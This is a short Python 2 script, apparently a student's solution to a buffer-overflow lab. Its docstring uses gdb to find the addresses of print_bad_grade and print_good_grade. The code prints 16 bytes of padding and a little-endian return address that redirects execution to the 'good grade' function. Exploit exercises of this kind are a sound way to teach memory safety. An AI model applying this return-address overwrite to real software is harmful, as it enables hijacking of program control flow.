'''
By using gdb disas print_bad_grade and disas print_good_grade,
we obtains the address for those two functions.
0x08048ee0 print_bad_grade
0x08048efe print_good_grae
Be aware that x86 is little endian!
We know that lea -0xc(%ebp), %eax has 12 addresses
then we have overflow the memory for main frame which is 4 byte.
So, we have to padd 16 bytes to overwrite return address.
'''
from struct import pack
print "\00"*16 +  pack("<I",0x08048efe)
